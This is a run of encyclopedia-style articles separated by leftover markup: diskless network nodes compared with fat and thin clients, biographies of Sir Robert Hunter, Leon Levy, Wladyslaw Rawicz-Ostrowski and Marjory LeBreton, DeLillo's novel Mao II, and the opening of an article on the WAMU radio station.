Windows 3.x and Windows 95 OSR1 supported Remote Boot operations, from NetWare servers, Windows NT Servers and even DEC Pathworks servers.

Third party software vendors such as Qualystem (acquired by Neoware), LanWorks (acquired by 3Com), Ardence (acquired by Citrix Systems), APCT and Xtreamining Technology have developed and marketed software products aimed to remote-boot newer versions of the Windows product line: Windows 95 OSR2 and Windows 98 were supported by Qualystem and Lanworks, Windows NT was supported by APCT and Ardence (called VenturCom at that time), and Windows 2000/XP/2003/Vista/Windows 7 are supported by Hewlett-Packard (which acquired Neoware which had previously acquired Qualystem) and Citrix Systems (which acquired Ardence).

==Comparison with fat clients==

===Software installation and maintenance===

With essentially a single OS image for an array of machines (with perhaps some customizations for differences in hardware configurations among the nodes), installing software and maintaining installed software can be more efficient. Furthermore, any system changes made during operation (due to user action, worms, viruses, etc.) can be either wiped out when the power is removed (if the image is copied to a local RAM disk) such as Windows XP Embedded remote boot or prohibited entirely (if the image is a network filesystem). This allows use in public access areas (such as libraries) or in schools etc., where users might wish to experiment or attempt to &quot;hack&quot; the system.

However, it is not necessary to implement network booting to achieve either of the above advantages - ordinary PCs (with the help of appropriate software) can be configured to download and reinstall their operating systems on (e.g.) a nightly basis, with extra work compared to using shared disk image that diskless nodes boot off.

Modern diskless nodes can share the very same disk image, using a 1:N relationship (1 disk image used simultaneously by N diskless nodes). This makes it very easy to install and maintain software applications: The administrator needs to install or maintain the application only once, and the clients can get the new application as soon as they boot off the updated image. Disk image sharing is made possible because they use the write cache: No client competes for any writing in a shared disk image, because each client writes to its own cache.

All the modern diskless nodes systems can also use a 1:1 Client-to-DiskImage relationship, where one client &quot;owns&quot; one disk image and writes directly into said disk image. No write cache is used then.

Making a modification in a shared disk image is usually made this way:

#The administrator makes a copy of the shared disk image that he/she wants to update (this can be done easily because the disk image file is opened only for reading)
#The administrator boots a diskless node in 1:1 mode (unshared mode) from the copy of the disk image he/she just made
#The administrator makes any modification to the disk image (for instance install a new software application, apply patches or hotfixes)
#The administrator shutdowns the diskless node that was using the disk image in 1:1 mode
#The administrator shares the modified disk image
#The diskless nodes use the shared disk image (1:N) as soon as they are rebooted.

===Centralized storage===

The use of central disk storage also makes more efficient use of disk storage. This can cut storage costs, freeing up capital to invest in more reliable, modern storage technologies, such as RAID arrays which support redundant operation, and storage area networks which allow hot-adding of storage without any interruption. Further, it means that losses of disk drives to mechanical or electrical failure—which are statistically highly probable events over a timeframe of years, with a large number of disks involved—are often both less likely to happen (because there are typically fewer disk drives that can fail) and less likely to cause interruption (because they would likely be part of RAID arrays). This also means that the nodes &quot;themselves&quot; are less likely to have hardware failures than fat clients.

Diskless nodes share these advantages with thin clients.

====Performance of centralized storage====

However, this storage efficiency can come at a price. As often happens in computing, increased storage efficiency sometimes comes at the price of decreased performance.

Large numbers of nodes making demands on the same server simultaneously can slow down everyone&#x27;s experience. However, this can be mitigated by installing large amounts of RAM on the server (which speeds up read operations by improving caching performance), by adding more servers (which distributes the I/O workload), or by adding more disks to a RAID array (which distributes the &quot;physical&quot; I/O workload). In any case this is also a problem which can affect &quot;any&quot; client-server network to some extent, since, of course, fat clients also use servers to store user data.

Indeed, user data may be much more significant in size and may be accessed far more frequently than operating systems and programs in some environments, so moving to a diskless model will not &quot;necessarily&quot; cause a noticeable degradation in performance.

Greater network bandwidth (i.e. capacity) will also be used in a diskless model, compared to a fat client model. This does not necessarily mean that a higher capacity network infrastructure will need to be installed—it could simply mean that a higher proportion of the existing network capacity will be used.

Finally, the combination of network data transfer latencies (physically transferring the data over the network) and contention latencies (waiting for the server to process other nodes&#x27; requests before yours) can lead to an unacceptable degradation in performance compared to using local drives, depending on the nature of the application and the capacity of the network infrastructure and the server.

===Other advantages===

Another example of a situation where a diskless node would be useful is in a possibly hazardous environment where computers are likely to be damaged or destroyed, thus making the need for inexpensive nodes, and minimal hardware a benefit. Again, thin clients can also be used here.

Diskless machines may also consume little power and make little noise, which implies potential environmental benefits and makes them ideal for some computer cluster applications.

==Comparison with thin clients==

Both thin client and diskless node architectures employ diskless clients which have advantages over fat clients (see above), but differ with regard to the location of processing.

===Advantages of diskless nodes over thin clients===
*Distributed load The &quot;processing&quot; load of diskless nodes is distributed. Each user gets its own processing isolated environment, barely affecting other users in the network, as long as their workload is not filesystem-intensive. Thin clients rely on the central server for the processing and thus require a fast server. When the central server is busy and slow, both kinds of clients will be affected, but thin clients will be slowed completely, whereas diskless nodes will only be slowed when accessing data on the server.
*Better multimedia performance. Diskless nodes have advantages over thin clients in multimedia-rich applications that would be bandwidth intensive if fully served. For example, diskless nodes are well suited for video gaming because the rendering is local, lowering the latency.
*Peripheral support Diskless nodes are typically ordinary personal computers or workstations with no hard drives supplied, which means the usual large variety of peripherals can be added. By contrast, thin clients are typically very small, sealed boxes with no possibility for internal expansion, and limited or non-existent possibility for external expansion. Even if e.g. a USB device can be &quot;physically&quot; attached to a thin client, the thin client software might not support peripherals beyond the basic input and output devices - for example, it may not be compatible with graphics tablets, digital cameras or scanners.

===Advantages of thin clients over diskless nodes===
*The hardware is cheaper on thin clients, since processing requirements on the client are minimal, and 3D acceleration and elaborate audio support are not usually provided. Of course, a diskless node can also be purchased with a cheap CPU and minimal multimedia support, if suitable. Thus, cost savings may be smaller than they first appear for some organizations. However, many large organizations habitually buy hardware with a higher than necessary specification to meet the needs of particular applications and uses, or to ensure future proofing &quot;(see next point)&quot;. There are also less &quot;rational&quot; reasons for overspecifying hardware which quite often come into play: departments wastefully using up budgets in order to retain their current budget levels for next year; and uncertainty about the future, or lack of technical knowledge, or lack of care and attention, when choosing PC specifications. Taking all these factors into account, thin clients may bring the most substantial savings, as only the servers are likely to be substantially &quot;gold-plated&quot; and/or &quot;future-proofed&quot; in the thin client model.
*Future proofing is not much of an issue for thin clients, which are likely to remain useful for the entirety of their replacement cycle - one to four years, or even longer - as the burden is on the servers. There are issues when it comes to diskless nodes, as the processing load is potentially much higher, thus meaning more consideration is required when purchasing. Thin client networks may require significantly more powerful servers in the future, whereas a diskless nodes network may in future need a server upgrade, a client upgrade, or both.
*Thin client networks have less network bandwidth consumption potentially, since much data is simply read by the server and processed there, and only transferred to the client in small pieces, as and when needed for display. Also, transferring graphical data to the display is usually more suited for efficient data compression and optimisation technologies (see e.g. NX technology) than transferring arbitrary programs, or user data. In many typical application scenarios, both total bandwidth consumption and &quot;burst&quot; consumption would be expected to be less for an efficient thin client, than for a diskless node.

<text>Sir Robert Hunter (27 October 1844 – 6 November 1913) was a solicitor, civil servant and co-founder of the National Trust.

From the 1860s Hunter was interested in conservation of public open spaces, and worked with other pioneers in this field, including Octavia Hill and Hardwicke Rawnsley. After acting as adviser to Hill in her campaigns to save Hampstead Heath and other open spaces, he worked with Rawnsley to save land in the English Lake District from industrial development. In 1893 the three campaigners agreed to set up a national body to acquire vulnerable properties and preserve them for the nation. At Hunter&#x27;s suggestion it was entitled &quot;the National Trust for Places of Historic Interest or Natural Beauty&quot;, generally known simply as &quot;the National Trust&quot;. Hunter was the founding chairman of the trust&#x27;s executive board.

From 1882 until the year of his death Hunter was solicitor to the General Post Office. His negotiations in that capacity were estimated to have saved the British taxpayer many millions of pounds.

==Life and career==

===Early years===
Hunter was born at Addington Square, in the south London suburb of Camberwell, the elder child and only son of Robert Lachlan Hunter, a master mariner and shipowner, and his wife, Anne, &quot;née&quot; Lachlan. He was educated privately until 1861 when he was admitted to University College, London. In the same year his family left London for Dorking, which was his first contact with the commons and hills of Surrey which he would come to love in later life.

Hunter was awarded a first-class degree in logic and moral philosophy in 1863. At his father&#x27;s suggestion he took up a post as an articled clerk in a firm of solicitors in London. Finding the work uninteresting he read for a master&#x27;s degree in his spare time.

In 1866 the philanthropist and politician Henry Peek ran a contest offering prizes of £400 for essays on the best means of preserving common land for the public. Hunter&#x27;s entry, &quot;The Preservation of Commons in the Neighbourhood of the Metropolis&quot;, was one of six winning essays. He traced the history and legal standing of the rights of common: &quot;substantial privileges which were maintainable at law. Though a person claiming common of pasture in another&#x27;s soil had no interest in that soil, yet he had a certain right over it, and could prevent by legal process any dealings with it which would prejudice this right.&quot; This principle, Hunter maintained, had been extended from old grazing rights to a modern requirement that common land should not be enclosed without due regard for &quot;the health, comfort and convenience of the inhabitants&quot; of nearby urban areas.

The six essays were published in one volume in 1867. In the same year Hunter was admitted solicitor. He became a partner in Fawcett, Horne, and Hunter, solicitors to the recently established Commons Preservation Society.

===Commons Preservation Society===

Hunter worked with the society to save common land from enclosure. He instituted legal actions that ensured protection of Hampstead Heath, and Berkhamsted, Plumstead, Wimbledon and Tooting commons and other open spaces threatened with enclosure. Most of the principles of public interest expounded in his 1866 essay were incorporated into English law in 1875. From the latter year onwards, Hunter was Octavia Hill&#x27;s adviser on the protection of open spaces in London.

One of Hunter&#x27;s most celebrated successes was the rescue from enclosure of 3,000 acres of Epping Forest, with the support of the corporation of the City of London. The case was bitterly contested across three years. Hunter acted with the corporation&#x27;s solicitor, Sir Thomas Nelson, in the conduct of the legal proceedings. In 1882 Queen Victoria went to the forest and formally declared it &quot;available for her people&#x27;s enjoyment&quot;.

===Post Office===
A leading member of the Commons Preservation Society during this period was the Liberal politician Henry Fawcett. He was appointed Postmaster General by Gladstone in 1880. When the post of solicitor to the General Post Office (GPO) became vacant in 1881 Fawcett decided that Hunter would be the best choice for the position. Hunter&#x27;s fitness for the post was confirmed by independent advisers and he was appointed on 1 February 1882. Fawcett later said that nothing in his official career had given him more satisfaction than securing a man of Hunter&#x27;s character and ability for the service of the nation.

Hunter remained as solicitor to the GPO until the year of his death. Much of his work was in preparing draft legislation on Post Office matters to be put before Parliament. There were more than fifty such drafts during Hunter&#x27;s tenure. His biographer L W Chubb singles out the Conveyance of Mails Act, 1893, which established an arbitration procedure for disputes between the railway companies and the GPO about charges for transporting mail by train. Chubb calculates that this one measure saved the taxpayer more than £10m. Hunter&#x27;s other most important contribution, in Chubb&#x27;s view, was the negotiation of the terms for acquiring the National Telephone Company&#x27;s system, which saved another £8.5m.

===National Trust===
In 1883 Canon Hardwicke Rawnsley was engaged in a campaign to stop the construction of railways from quarries in the fells overlooking Buttermere, in the English Lake District, with damaging effect on the unspoilt scenery. He secured the support of John Ruskin, Octavia Hill and Hunter, and was successful in stopping the development. Both Hunter and Rawnsley, building on an idea put forward by Ruskin, advocated a trust that could buy and preserve places of natural beauty and historic interest for the nation.

The need for such a body was emphasised in 1886, when the owner of Sayes Court, a manor house in Deptford, wished to give it to the nation, but could not because no national organisation existed to accept the gift. He established a permanent trust under the chairmanship of the vicar of the parish, and presented the house and gardens with a substantial financial endowment to maintain them.
In November 1893 Hill, Hunter and Rawnsley met at the offices of the Commons Preservation Society. They agreed to set up a national body, to propagate the formation of a &quot;National Trust for Places of Historic Interest or Natural Beauty&quot;. In July 1894 the trust was formally inaugurated under the presidency of the Duke of Westminster. At the inaugural meeting Rawnsley declared, to cheering, that the aim was to establish &quot;a great National Gallery of natural pictures&quot;. Hunter was appointed chairman of the executive committee. In the same year he was knighted for his services to conservation.

Hunter had warned the inaugural meeting that the trust would be on a truly secure footing only if it obtained the permanent status granted by either a royal charter or an Act of Parliament. He drafted the 1907 National Trust Bill, which was put before Parliament, giving the trust the status of a statutory corporation. He gave formal evidence to the parliamentary committee that scrutinised the bill, and the bill was passed in August 1907.

By the time of the 1907 Act, the trust had acquired 25 properties in England, Wales and Ireland, ranging from 850 acres of open country in the Lake District, to common land in Surrey to castles in County Cork and Derbyshire to coastal land in Cornwall and Cambridgeshire.

Hunter was appointed CB in 1909 and promoted to KCB in 1911 for his services to the Post Office. He retired at the end of July 1913, and died at the age of 69 of toxaemia less than four months later at his house at Meadfields Hanger, Haslemere, Surrey. Fourteen acres of water and woodland at Waggoners Wells were bought by public subscription and given to the National Trust to honour his memory.

==Personal life==
In 1869 Hunter married Emily Browning; she died in childbirth on 2 January 1872. He did not remarry until May 1877. His second wife, Ellen &quot;née&quot; Cann (1851–1932) was the daughter of a land surveyor, Samuel Cann. There were three daughters of the second marriage. In politics, &quot;The Times&quot; said, &quot;Sir Robert was a robust thoughtful Liberal of the older type. As a speaker he was admirably clear and direct, articulate but not rhetorical, relying far more on the persuasive forced of exact statement than on appeals to emotion.&quot; In religion, he was a broad-church Anglican.

<doc id="1341271" wikidata="Q6753587" url="?curid=1341271" title="Mao II">
<text>Mao II, published in 1991, is Don DeLillo&#x27;s tenth novel. The book tells the story of a novelist, struggling to finish a novel, who travels to Lebanon to assist a writer being held hostage. The title is derived from a series of Andy Warhol silkscreen prints depicting Mao Zedong. DeLillo dedicated the book to his friend Gordon Lish. Major themes of the book include crowds and the effects of political terrorism. &quot;Mao II&quot; received positive reviews from critics and won the PEN/Faulkner Award in 1992.

==Plot summary==

A reclusive novelist named Bill Gray works endlessly on a novel which he chooses not to finish. He has chosen a life secluded from the outside world in order to try to keep his writing pure. He, along with his assistant Scott, believes that something is lost once a mass audience reads the work. Scott would prefer Bill didn&#x27;t publish the book for fear that the mass-production of the work will destroy the &quot;real&quot; Bill. Bill has a dalliance with Scott&#x27;s partner Karen Janney, a former member of the Unification Church who is married to Kim Jo Pak in a Unification Church Blessing ceremony in the prologue of the book.

Bill, who lives as a complete recluse, accedes to be photographed by a New York photographer named Brita who is documenting writers. In dialogue with Brita and others, Bill laments that novelists are quickly becoming obsolete in an age where terrorism has supplanted art as the &quot;raids on consciousness&quot; that jolt and transform culture at large. Bill disappears without a word and secretly decides to accept an opportunity from his former editor Charles to travel to London to publicly speak on the behalf of a Swiss writer held hostage in war-torn Beirut.

Meanwhile, Karen ends up living in Brita&#x27;s New York apartment and spends most of her time in the homeless slums of Tompkins Square Park. In London, Bill is introduced to George Haddad, a representative of the Maoist group responsible for kidnapping the writer. Bill decides to go to Lebanon himself and negotiate the release of the writer. Cutting himself off from Charles, he flees to Cyprus where he awaits a ship that will take him to Lebanon.

In Cyprus, Bill is hit by a car and suffers a lacerated liver which, exacerbated by his heavy drinking, kills him in his sleep while en route to Beirut. In the epilogue, Brita goes to Beirut to photograph Abu Rashid, the terrorist responsible for the kidnapping. The fate of the hostage is never revealed, though the implication is grim. The plot unfolds with DeLillo&#x27;s customary shifts of time, setting, and character.

==Themes==

The last sentence of the prologue reveals an important and major theme in &quot;Mao II&quot;: &quot;The future belongs to crowds.&quot; Crowds feature heavily in the book, from the opening crowds of thousands at the mass wedding at Yankee Stadium, to the crowds living in Tompkins Square Park, to the thousands of mourners at the Ayatollah&#x27;s funeral as observed on television by Karen. The nature of crowds and their relation to personal and collective identity are explored.

In predicting an age of terror in which &quot;the major work involves midair explosions and crumbled buildings,&quot; DeLillo was eerily ahead of his time in contemplating the profound effect that political terror was soon to have on American society. The question of the efficacy of art in the context of dogmatism and violence of a massive scale is central to the narrative. In preparing the novel, DeLillo&#x27;s editor at Viking, Nan Graham, said, &quot;Long before he had written anything Don told me he had two folders -- one marked &#x27;art&#x27; and the other marked &#x27;terror.&#x27;&quot;

Just two years before the novel was published Khomeini issued a fatwa calling for the death of Salman Rushdie after his publication of &quot;The Satanic Verses&quot; and &quot;New York Post&quot; photographers had ambushed J. D. Salinger in New Hampshire. DeLillo cited the published Salinger photograph and a photograph of a Unification Church Blessing ceremony he came across as inspiration for the book, telling Vince Passaro:
==Thomas Pynchon blurb==
Notoriously reclusive author Thomas Pynchon provided the blurb for &quot;Mao II.&quot; It reads: &quot;This novel&#x27;s a beauty. DeLillo takes us on a breathtaking journey, beyond the official versions of our daily history, behind all easy assumptions about who we&#x27;re supposed to be, with a vision as bold and a voice as eloquent and morally focused as any in American writing.&quot;

==Reception==
In &quot;The Washington Post&quot;, Sven Birkerts referred to &quot;Mao II&quot; as one of DeLillo&#x27;s best novels. While arguing that &quot;the tension that gathers around Gray dissipates towards the end and the final pages feel unfocused&quot;, Birkerts praised the ways in which the crowd motif is threaded throughout the novel and also praised the secondary characters, writing, &quot;There is always a new angle, a new window onto a world in its paroxysms of transformation.&quot; Birkerts lauded the work as &quot;DeLillo&#x27;s strongest statement yet about the crisis of crises. Namely: that we are living in the last violet twilight of the individual&quot;. In &quot;The New York Times,&quot; Lorrie Moore wrote that &quot;no one&#x27;s prose is better than Mr. DeLillo&#x27;s&quot;, and noted the author&#x27;s &quot;way of capturing a representative slice of a city, his ability to reproduce ineffable urban rhythms, his startling evocations of sights and smells.&quot; While writing that she was more &quot;engaged and impressed&quot; than moved by &quot;Mao II&quot; and that the novel has less emotional depth than &quot;White Noise&quot; and &quot;Libra&quot;, Moore still praised DeLillo&#x27;s ability to convey multiple points of view and argued that &quot;within its own defined parameters [...] Mr. DeLillo&#x27;s new book succeeds as brilliantly as any of his others.&quot;

A reviewer for &quot;Publishers Weekly&quot; deemed the novel a &quot;remarkable achievement&quot; and stated, &quot;The beauty of DeLillo&#x27;s prose enlivens such seemingly dry questions. &quot;Mao II&quot; reconfirms DeLillo&#x27;s status as a modern master and literary provocateur.&quot; It also received praise in &quot;Kirkus Reviews&quot;, where the reviewer wrote that the author&#x27;s &quot;talking heads murmur the mysteries of our age. For all its &#x27;cool gloom,&#x27; his latest novel stands in denial of Gray&#x27;s doom-drenched semiotics: it&#x27;s a luminous book, full of anger deflected into irony, with moments of hard-earned transcendence.&quot;

Conversely, John Lanchester argued in the &quot;London Review of Books&quot; that &quot;Mao II&quot; had a &quot;rather over-schematic central theme and plot-strand” and criticized the novel as &quot;[trying] to force home Gray’s arguments that ‘what terrorists gain, novelists lose’. This, oddly enough, is to do those ideas a disservice, as, in Keats&#x27;s famous words, ‘we hate poetry that has a palpable design on us.’ I don’t think I will be the only reader of &quot;Mao II&quot; to miss DeLillo in his comic vein, the comic vein which hasn’t at all precluded seriousness in his other work; its absence in &quot;Mao II&quot; is, I’m afraid, likely to have something to do with a vocational self-importance.&quot; In &quot;The New York Review of Books&quot;, Robert Towers wrote, &quot;&quot;Mao II&quot; is a more somber work, less concentrated as a narrative; and it is shorter than either of its predecessors. The cast of characters is relatively small, and the characters themselves, while sharply delineated, are perhaps less interesting in the long run than the images and themes that cluster around them.&quot;

&quot;Mao II&quot; was placed in the second tier (&quot;Recommended&quot;) in a 2007 &quot;New York&quot; guide to DeLillo&#x27;s oeuvre, where the novel was described as &quot;DeLillo at his most aphoristic [...] Less a novel than a series of crowd-scene set pieces linked by a reclusive novelist’s attempt to free a poet hostage, it contains his most extended thoughts on the relationship between fiction and terrorism.&quot; In 2011, Martin Amis listed &quot;Mao II&quot; among his favorite novels in DeLillo’s output. In a 2016 retrospective write-up for &quot;Granta&quot;, Colin Barrett lauded &quot;Mao II&quot; as a &quot;mordantly funny, casually prescient, hypnotically condensed novel about art, about terror [...] short, loosely plotted but simultaneously tight as a drum&quot;. Jeff Somers ranked it sixth among 17 DeLillo books, arguing that &quot;it doesn’t have much of a plot and can be perceived as DeLillo disappearing into himself—but when you’re as strong a writer as DeLillo, you can get away with that. Its seemingly prophetic vision of terrorist acts to come (it was published in 1991) grant the book gravitas&quot;.

<doc id="1341275" wikidata="Q15514709" url="?curid=1341275" title="Leon Levy">
<text>Leon Levy (September 13, 1925 – April 6, 2003) was an American investor, mutual fund manager, and philanthropist. At his death, Forbes magazine called him “a Wall Street investment genius,” who helped create both mutual funds and hedge funds.

==Early life and education==
Born to a Jewish family, Levy attended Townsend Harris High School and studied psychology at City College of New York. After serving in the U.S. Army, he began working as a research analyst. He was strongly influenced in his business approach by his father, Jerome Levy, an economist and business executive who emphasized the role corporate profits play in charting the economy&#x27;s direction.

== Investment career ==
In 1956 he became a partner of Oppenheimer &amp; Co. Inc, then in 1959 Levy co-founded the Oppenheimer mutual funds. There he started dozens of mutual funds that, at his death, had grown to manage more than $120 billion. In 1982, he sold both companies to the U.K.&#x27;s Mercantile House for $162 million and co-founded Odyssey Partners, a private investment partnership. It grew to be a $3 billion hedge fund before it was dissolved in 1997.

==Wealth and philanthropy==
In 1986, to honor his father, he founded the Jerome Levy Economics Institute, now the Levy Institute, at Bard College in Annandale-on-Hudson, New York. The Levy Institute has established itself as a sponsor of extensive work in Keynesian and post-Keynesian economics. In the last year of his life, Levy commuted up the Hudson River from New York City to teach a class at the Levy Institute, &quot;Contemporary Developments in Finance&quot;, in which he focused on his belief that investing is as much a psychological as it is an economic act.

When he died in his late seventies, Levy was estimated to be worth a billion dollars, though his personal wealth might have been substantially higher were it not for his philanthropic interests.

Levy&#x27;s philanthropy began in the 1950s, when he established the Jerome Levy Foundation, which still exists, giving grants to human rights and land preservation organizations. His donations grew steadily, and during his lifetime, Levy and his wife, Shelby White, gave away more than $200 million, becoming well known for their philanthropic efforts. They donated $20 million to the Metropolitan Museum of Art for the construction of the Leon Levy and Shelby White Court, a gallery hosting the largest selection of Hellenistic and Roman artwork ever exhibited at that museum. The gallery included a number of pieces from Levy and White&#x27;s substantial art collection, which also includes art from the Near East. Between 1997 and 2003, Levy and White donated nearly $5 million to 107 scholars for the publication of archaeological excavations that had been completed but never published. The projects funded by their program, the Shelby White-Leon Levy Program for Archaeological Publications, include excavations at some of the highest profile archaeological sites throughout Greece and the Middle East, including Knossos, Aphrodisias, Kition, Ras Shamra, Sarepta, Mount Gerizim, Ekron, Lachish, Megiddo, Jerusalem, Pella, Jerash, the Dead Sea Scrolls, Assur, Nineveh, Nuzi, and Tepe Hissar.

They also funded the Leon Levy Expedition at Ashkelon, Israel; created the Leon Levy Visitor Center at the New York Botanical Garden; and financed the Shelby White and Leon Levy Center for Mind Brain and Behavior at Rockefeller University, where Levy was a member of the Board. Levy also served as President of the Board of the Institute for Advanced Study, Vice Chairman of the Institute of Fine Arts at New York University, and was a director of Bard College, and many other not-for-profit boards.

The Leon Levy Foundation and Shelby White, as Chairman of the Friends of the Israel Antiquities Authority, provided the funds for conserving the extraordinarily well-preserved Lod Mosaic and established the Shelby White and Leon Levy Lod Mosaic Archaeological Center, which will house the mosaic once it returns from its 2010-2016 international exhibition tour.
After his death in 2003, Levy&#x27;s philanthropy was continued through the Leon Levy Foundation, and one of its earliest initiatives was the fulfillment of that plan. In spring, 2006, the Leon Levy Foundation pledged $200 million to New York University for the creation of the Institute for the Study of the Ancient World, a center for advanced scholarly research and graduate education, intended to cultivate cross-cultural study of the ancient world, from the western Mediterranean to China.

===Antiquities controversy===
The donation created controversy among some academics who believe that collectors of antiquities encourage the looting of ancient sites. In their 2006 book &quot;The Medici Conspiracy: The Illicit Journey of Looted Antiquities – From Italy&#x27;s Tomb Raiders to the World&#x27;s Greatest Museums&quot;, Peter Watson and Cecelia Todeschini lay out the dynamics of the illegal trade in antiquities and use Leon Levy and Shelby White as an example of collectors whose purchases may have led to unethical dealing in artifacts.

One NYU professor, Randall White, resigned from NYU&#x27;s existing Center for Ancient Studies – which is independent of the new Institute for the Study of the Ancient World – saying that he opposed the acceptance of a donation from a foundation whose benefactor had sometimes been associated with such questionable practices and trafficking. Several scholars outside NYU, notably from Bryn Mawr College, the University of Pennsylvania and the University of Cincinnati, also commented negatively on NYU&#x27;s acceptance of the gift. Many other scholars, however, supported the institute and the gift. Professor James McCredie, of the Institute of Fine Arts, NYU&#x27;s graduate teaching and advanced research center for art history, wrote a letter to Provost David McLaughlin endorsing the project. It was signed by IFA&#x27;s seven professors of ancient art and architecture, and the controversy soon died out.

== Legacy and awards ==
In 2008, he was inducted into Institutional Investors Alpha&#x27;s Hedge Fund Manager Hall of Fame along with Alfred Jones, Bruce Kovner, David Swensen, George Soros, Jack Nash, James Simons, Julian Roberston, Kenneth Griffin, Louis Bacon, Michael Steinhardt, Paul Tudor Jones, Seth Klarman and Steven A. Cohen.

==Publications and works==
In 2002, Levy published a memoir, written with Eugene Linden, called &quot;The Mind of Wall Street: A Legendary Financier on the Perils of Greed and the Mysteries of the Market&quot; (Perseus Book Group).

<text>Wladyslaw Tomasz Rawicz-Ostrowski (1790-1869) was a Polish nobleman (szlachcic) and Count since 1798.

Wladyslaw was officer of the horse artillery in the army of the Duchy of Warsaw. He was awarded with the Virtuti Militari in 1809 after the Battle of Raszyn and with the Légion d&#x27;honneur order for Napoleon&#x27;s Russian Campaign from 1812 to 1813.

He left the army after Napoleon&#x27;s defeat. Later he tried his skills in poetry (he translated Lord Byron&#x27;s poems). In December 1830 he was elected the Marshal of the Sejm of the Kingdom of Poland and served until the end of the national November Uprising of 1830–1831. In emigration he became an activist of Hotel Lambert. Interned by the Austrians he spent most of his life in Graz and in 1861 was allowed to settle down in Kraków.

<text>Marjory LeBreton (born July 4, 1940) is a Canadian former leader of the Government in the Senate of Canada; a member of the Canadian cabinet; and past national chair of Mothers Against Drunk Driving in Canada. She worked with four leaders of the Progressive Conservative Party of Canada - John Diefenbaker, Robert Stanfield, Joe Clark and Brian Mulroney - from 1962 to 1993 before being appointed to the Senate on the advice of Mulroney. She sat as a Progressive Conservative Senator from her appointment until moving with most of her caucus colleagues to the new Conservative Party of Canada in 2004, of which she was soon elected to Chief Whip. She served as an advisor to then opposition leader Stephen Harper during the 2006 election, which the Conservative Party won. After the election, she was named to the cabinet position Leader of the Government in the Senate. On July 4, 2013, LeBreton announced she would not continue in the position as of the next cabinet shuffle, which occurred later that summer. She retired from the Senate upon reaching her 75th birthday on July 4, 2015.

== Early and personal life ==
Marjory LeBreton was born in and completed her elementary and secondary school education in the neighbourhood of City View, in the city of Nepean, Ontario, which is today part of Ottawa. She was married to Douglas LeBreton (1934–2022), with whom she had two children: Linda and Michael. Linda was killed in an accident involving a drunk driver which led to LeBreton&#x27;s active involvement in the Mothers Against Drunk Driving organization. 

== Progressive Conservative staffer ==
LeBreton began working at Progressive Conservative party headquarters in 1962, moving from there to the office of leader John Diefenbaker when he became opposition leader following the 1963 election. During her time in the leader&#x27;s office, she accompanied him on a national whistlestop tour during the 1965 election.

Following Diefenbaker&#x27;s resignation as leader, she continued in the leader&#x27;s office under Robert Stanfield through his three election campaigns - 1968, 1972 and 1974. When Stanfield announced his resignation in 1975, she went to work in the PC Party office helping to coordinate the 1976 Progressive Conservative leadership convention. Joe Clark won the 1976 convention and hired LeBreton as his office&#x27;s tour coordinator, a position she held until Clark won the 1979 federal election.

LeBreton later worked in the office of Brian Mulroney while he was prime minister, rising to position of Deputy Chief of Staff and Government Appointments Director. She was appointed by Mulroney to the Senate on June 18, 1993, shortly before his retirement from politics.

== Senator ==
LeBreton is generally considered to be a Red Tory and is progressive on social issues such as abortion rights. She was also one of the few politicians in the Parliament of Canada to oppose Bill C-36, Canada&#x27;s anti-terrorism legislation in 2001.

She was a long-time foe of proposals to merge the Progressive Conservatives with the Canadian Alliance but reluctantly supported the late 2003 proposal to unite the parties and subsequently became a Conservative Party of Canada senator once the merger was completed. Over time, she warmed to the new party, and later served as one of Stephen Harper&#x27;s top advisors in the 2006 federal election.

Senator LeBreton was appointed Leader of the Government in the Senate by Prime Minister Stephen Harper in February 2006 and also acquired the role of Secretary of State for Seniors during a cabinet shuffle on January 4, 2007. On July 4, 2013, she announced her resignation from the cabinet after a stormy period of expenses scandals that tarnished the reputation of the Conservatives, but remained a Conservative Senator for Ontario. Senator LeBreton was an important figure during the Canadian Senate expenses scandal, having ordered the initial audit by Deloitte of senatorial expenses, after accusations of misappropriation were levelled against Canadian senators, most famously Mike Duffy, whose name became synonymous with the scandal. While she received a backlash for her role as the government leader at the time of the misappropriations, she was adamant that an investigation needed to proceed. Criticism was levelled at her from both party critics and loyalists, with the former claiming she was involved in a whitewash, and the latter claiming she was underhandedly promoting controversial Senate reform. As the scandals intensified, LeBreton gave a defiant speech to the Senate in which she said Ottawa was &quot;populated by Liberal elites and their media lickspittles&quot;. LeBreton was well known for her campaign work where her job was to &quot;assist the media.&quot;

=== Committee assignments ===
Following her appointment to the Senate, during the 34th Canadian Parliament, she sat on the Standing Committee on Internal Economy, Budgets and Administration.

During the 35th Parliament, she sat on the Internal Economy committee, Standing Committee on Social Affairs, Science and Technology, Standing Committee on Agriculture and Forestry, as well as the Special Committee on Pearson Airport Agreements.

In the 36th Parliament, she sat on the Internal Economy committee, Social Affairs committee, Agriculture and Forestry committee, Standing Committee on Transport and Communications, Standing Committee on Banking, Trade and Commerce, as well as the Special Committee on Security and Intelligence.

In the 37th Parliament, she sat on the Social Affairs committee, the Agriculture and Forestry committee, the Transport and Communications committee, the Standing Committee on Privileges, Standing Rules and Orders, and the Standing Committee on National Finance.

In the 38th Parliament, she sat on the Social Affairs committee, the Transport and Communications committee, the Standing Committee on Rules, Procedures and the Rights of Parliament, the Standing Committee on Human Rights, and the Standing Committee on Foreign Affairs.

In the 39th Parliament, she sat on the Social Affairs committee, the Rules committee, the Human Rights committee and the Foreign Affairs committee.

During the 37th, 38th and 39th parliaments, she was vice-chair of the Social Affairs committee. During the 40th Parliament, as government leader, she did not sit formally on any committee, but was an ex-officio member of them all.

<text>WAMU (88.5 FM) is a public news–talk station that services the greater Washington, DC metropolitan area. It is owned by American University, and its studios are located near the campus in northwest Washington. WAMU has been the primary National Public Radio member station for Washington since 2007.

==History==
WAMU began as an AM carrier-current student radio station, signing on July 28, 1951, on , before shifting to in March 1952 and in November 1952. Although carrier-current stations are not granted a license or call sign by the FCC, it used &quot;WAMU&quot; as a familiar form of identification. The station aired a wide range of student-produced programming including music, news, sports, radio dramas, and debates. The station was heralded as a rebirth of the university&#x27;s prior radio station, WAMC, which operated on for about two years starting on January 15, 1947, broadcasting with a 50-watt transmitter as part of a plan to offer a full range of radio and television courses at American University. WAMC&#x27;s operations were sporadic and the station suffered interference from a 50,000-watt station broadcasting from Mexico on the same frequency, but it finally went off the air after station equipment was stolen in 1950.

